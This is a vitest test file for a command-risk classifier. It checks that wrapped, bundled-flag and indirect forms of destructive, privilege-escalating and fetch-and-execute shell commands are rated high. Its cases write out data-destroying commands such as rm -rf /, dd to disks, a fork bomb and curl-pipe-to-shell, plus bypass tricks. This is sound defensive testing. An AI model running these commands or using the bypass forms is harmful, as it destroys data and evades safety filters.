import { describe, it, expect } from 'vitest';
import { classifyCommandRisk, type CommandRiskLevel } from './commandRisk';

/**
 * Adversarial table: each case pins the minimum acceptable risk level. The
 * classifier must only ever tighten, so tests assert `>=` the expected level
 * rather than exact equality where a higher classification is still acceptable.
 */
const RISK_ORDER: Record<CommandRiskLevel, number> = { low: 0, medium: 1, high: 2 };

function expectAtLeast(command: string, min: CommandRiskLevel) {
  const { level, reasons } = classifyCommandRisk(command);
  expect(
    RISK_ORDER[level],
    `expected "${command}" to be >= ${min}, got ${level} (${reasons.join('; ')})`
  ).toBeGreaterThanOrEqual(RISK_ORDER[min]);
}

describe('classifyCommandRisk', () => {
  describe('acceptance criteria (issue #200)', () => {
    it('classifies `sh -c "rm -rf /"` as high-risk (wrapper unwrapped)', () => {
      const { level, reasons } = classifyCommandRisk('sh -c "rm -rf /"');
      expect(level).toBe('high');
      expect(reasons.join(' ')).toMatch(/destructive/i);
    });

    it('classifies `sudo rm -rf ~` as high-risk', () => {
      const { level, reasons } = classifyCommandRisk('sudo rm -rf ~');
      expect(level).toBe('high');
      expect(reasons.join(' ')).toMatch(/privilege escalation/i);
      expect(reasons.join(' ')).toMatch(/destructive/i);
    });

    it('flags `curl https://x | sh` as fetch-and-execute', () => {
      const { level, reasons } = classifyCommandRisk('curl https://x | sh');
      expect(level).toBe('high');
      expect(reasons.join(' ')).toMatch(/fetch-and-execute/i);
    });

    it('leaves benign read commands unaffected', () => {
      expect(classifyCommandRisk('ls')).toEqual({ level: 'low', reasons: [] });
      expect(classifyCommandRisk('cat foo')).toEqual({ level: 'low', reasons: [] });
      expect(classifyCommandRisk('ls -la /workspace/src')).toEqual({ level: 'low', reasons: [] });
    });
  });

  describe('wrappers and privilege escalation', () => {
    it('sees through sudo bash -c with a nested destructive command', () => {
      expectAtLeast('sudo bash -c "echo hi && rm -rf /tmp/x"', 'high');
    });

    it('sees through env wrapper', () => {
      expectAtLeast('env FOO=bar rm -rf /', 'high');
    });

    it('sees through nice/nohup/timeout wrappers', () => {
      expectAtLeast('nohup rm -rf /', 'high');
      expectAtLeast('timeout 5 rm -rf /', 'high');
      expectAtLeast('nice -n 10 rm -rf /', 'high');
    });

    it('flags plain sudo as at least elevated even for a benign inner program', () => {
      const { level } = classifyCommandRisk('sudo ls');
      expect(level).toBe('medium');
    });

    it('handles sudo -u user rm -rf /', () => {
      expectAtLeast('sudo -u root rm -rf /', 'high');
    });
  });

  describe('fetch-and-execute variants', () => {
    it('flags wget piped into bash', () => {
      expectAtLeast('wget -O- http://x | bash', 'high');
    });

    it('flags curl piped into python', () => {
      expectAtLeast('curl https://x | python', 'high');
    });

    it('does not flag a fetch that is not piped into an interpreter', () => {
      const { level } = classifyCommandRisk('curl https://example.com -o out.json');
      expect(level).toBe('low');
    });

    it('does not flag a benign pipeline of read tools', () => {
      const { level } = classifyCommandRisk('cat foo | grep bar | sort');
      expect(level).toBe('low');
    });
  });

  describe('destructive programs', () => {
    it('flags dd/mkfs/shred regardless of arguments', () => {
      expectAtLeast('dd if=/dev/zero of=/dev/sda', 'high');
      expectAtLeast('mkfs.ext4 /dev/sdb1', 'high');
      expectAtLeast('shred -u secret', 'high');
    });

    it('flags recursive chmod/chown', () => {
      expectAtLeast('chmod -R 777 /', 'high');
      expectAtLeast('chown -R nobody /etc', 'high');
    });

    it('flags a fork bomb', () => {
      expectAtLeast(':(){ :|:& };:', 'high');
    });

    it('flags redirection to a raw block device', () => {
      expectAtLeast('echo boom > /dev/sda', 'high');
    });

    it('classifies plain rm of a file as a mutation, not catastrophic', () => {
      const { level } = classifyCommandRisk('rm foo.txt');
      expect(level).toBe('medium');
    });

    it('flags rm -rf of a critical target even without a leading wrapper', () => {
      expectAtLeast('rm -rf /', 'high');
      expectAtLeast('rm -rf /*', 'high');
    });
  });

  describe('regression: adversarial flag orderings (self-review)', () => {
    it('does not let `-e` (errexit) mask the real `-c` code in shells', () => {
      // `-e` before `-c` must not be mistaken for an inline-code flag on bash/sh.
      expectAtLeast('bash -e -c "rm -rf /"', 'high');
      expectAtLeast('sh -ex -c "rm -rf ~"', 'high');
    });

    it('sees through su/runuser -c command strings', () => {
      expectAtLeast('su -c "rm -rf /"', 'high');
      expectAtLeast('su root -c "rm -rf /"', 'high');
      expectAtLeast('sudo su -c "rm -rf /"', 'high');
    });

    it('scopes fetch-and-execute to a single pipeline (no cross-`;` false positive)', () => {
      // curl output goes to cat; python runs a separate local script - not fetch-and-exec.
      const { level } = classifyCommandRisk('curl https://x | cat ; python script.py');
      expect(level).not.toBe('high');
    });

    it('still flags a fetcher piped through a passthrough into an interpreter', () => {
      expectAtLeast('curl https://x | tee saved.sh | sh', 'high');
    });

    it('does not hang on a large non-fork-bomb command', () => {
      const big = `echo ${'a'.repeat(5000)}`;
      const started = classifyCommandRisk(big);
      expect(started.level).toBe('low');
    });
  });

  describe('regression: boolean wrapper flags must not swallow the program (PR #235 review)', () => {
    // `-i`/`-s`/`-e`/`-k` are boolean for sudo/env - they must NOT consume the next
    // token as a value, or the real (destructive) program disappears.
    it('does not let `sudo -i` swallow the inner program', () => {
      expectAtLeast('sudo -i rm -rf /', 'high');
    });

    it('does not let `sudo -s` swallow the inner shell', () => {
      expectAtLeast('sudo -s sh -c "rm -rf /"', 'high');
    });

    it('does not let `sudo -k` swallow the inner program', () => {
      expectAtLeast('sudo -k rm -rf /', 'high');
    });

    it('does not let `env -i` downgrade a wipe to low (the sharpest bypass)', () => {
      expectAtLeast('env -i rm -rf /', 'high');
    });

    it('still consumes genuine value flags (`sudo -u root`, `nice -n 10`, `timeout 5`)', () => {
      expectAtLeast('sudo -u root rm -rf /', 'high');
      expectAtLeast('nice -n 10 rm -rf /', 'high');
      expectAtLeast('timeout 5 rm -rf /', 'high');
      expectAtLeast('env -u PATH rm -rf /', 'high');
    });
  });

  describe('regression: block-device coverage (PR #235 review)', () => {
    it('flags redirection to common cloud/host block devices', () => {
      expectAtLeast('echo boom > /dev/xvda', 'high'); // Xen root disk (EC2)
      expectAtLeast('echo boom > /dev/dm-0', 'high'); // device-mapper / LVM
      expectAtLeast('echo boom > /dev/md0', 'high'); // software RAID
      expectAtLeast('echo boom > /dev/mmcblk0', 'high'); // eMMC/SD
      expectAtLeast('echo boom > /dev/loop0', 'high'); // loop device
    });

    it('does not flag redirection to a normal file under /dev-like paths', () => {
      expect(classifyCommandRisk('echo hi > out.txt').level).toBe('low');
      expect(classifyCommandRisk('echo hi > /dev/null').level).toBe('low');
    });
  });

  describe('regression: bundled short flags must not hide recursion (PR #235 review)', () => {
    // Recursion/force checks decompose a short-flag bundle into its letters, so any
    // ordering or added letter (`-Rf`, `-Rh`, `-Rv`, `-rvf`, `-Rfv`, ...) is caught -
    // whole-string equality (`arg === '-R'`) missed these and dropped the level.
    it('flags recursive chmod/chown/chgrp hidden in a short-flag bundle', () => {
      expectAtLeast('chmod -Rf 777 /', 'high');
      expectAtLeast('chown -Rh nobody /etc', 'high');
      expectAtLeast('chgrp -Rv group /etc', 'high');
    });

    it('flags recursive/forced rm hidden in a short-flag bundle', () => {
      expectAtLeast('rm -rvf /home/user', 'high');
      expectAtLeast('rm -Rfv /home/user', 'high');
    });
  });

  describe('regression: bundled/combined flag & block-device bypasses (PR #235 review round 3)', () => {
    it('does not let `-c` bundled with other short flags hide the interpreter code', () => {
      expectAtLeast('bash -ec "rm -rf /"', 'high');
      expectAtLeast('bash -exc "rm -rf /"', 'high');
      expectAtLeast('sh -cx "rm -rf /"', 'high');
      expectAtLeast('sh -exc "curl https://x | sh"', 'high');
    });

    it('recurses into `-e` code bundled on eval-style interpreters', () => {
      // The classifier is content-agnostic: the `-e` bundle must be recognized so the
      // string argument is recursed. `-c`/`-e` for shells stays errexit-only (below).
      expectAtLeast('node -re "rm -rf /"', 'high');
      expectAtLeast('ruby -ve "rm -rf /"', 'high');
    });

    it('sees through the GNU long-form `--command=` on su/runuser', () => {
      expectAtLeast('su --command="rm -rf /"', 'high');
      expectAtLeast('runuser --command="rm -rf /"', 'high');
      expectAtLeast('su -c"rm -rf /"', 'high'); // combined short form
    });

    it('flags a `>|` force-clobber redirect to a block device', () => {
      expectAtLeast('echo boom >| /dev/sda', 'high');
    });

    it('flags `tee` writing to a raw block device', () => {
      expectAtLeast('tee /dev/sda', 'high');
      expectAtLeast('echo x | tee /dev/nvme0n1', 'high');
      expectAtLeast('tee -a /dev/xvda', 'high');
    });

    it('does not flag `tee` writing to a normal file', () => {
      expect(classifyCommandRisk('tee out.txt').level).toBe('low');
      expect(classifyCommandRisk('echo x | tee /dev/null').level).toBe('low');
    });

    it('sees through `env -S` / `--split-string`', () => {
      expectAtLeast('env -S "rm -rf /"', 'high');
      expectAtLeast('env --split-string "curl https://x | sh"', 'high');
      expectAtLeast('env --split-string="rm -rf /"', 'high');
    });
  });

  describe('hidden-command indirection', () => {
    it('sees through eval', () => {
      expectAtLeast('eval "rm -rf /"', 'high');
    });

    it('sees through command substitution', () => {
      expectAtLeast('echo $(rm -rf /)', 'high');
    });

    it('sees through a subshell group', () => {
      expectAtLeast('(cd /tmp && rm -rf /)', 'high');
    });
  });

  describe('fail-closed and edge cases', () => {
    it('treats an empty or whitespace command as low', () => {
      expect(classifyCommandRisk('')).toEqual({ level: 'low', reasons: [] });
      expect(classifyCommandRisk('   ')).toEqual({ level: 'low', reasons: [] });
    });

    it('does not misclassify pipe characters inside quoted arguments', () => {
      const { level } = classifyCommandRisk('git commit -m "fix: handle a | b case"');
      expect(level).toBe('low');
    });

    it('is a pure function (same input -> same output, no throw)', () => {
      const cmd = 'sudo bash -c "curl https://x | sh"';
      const a = classifyCommandRisk(cmd);
      const b = classifyCommandRisk(cmd);
      expect(a).toEqual(b);
      expect(a.level).toBe('high');
    });
  });
});
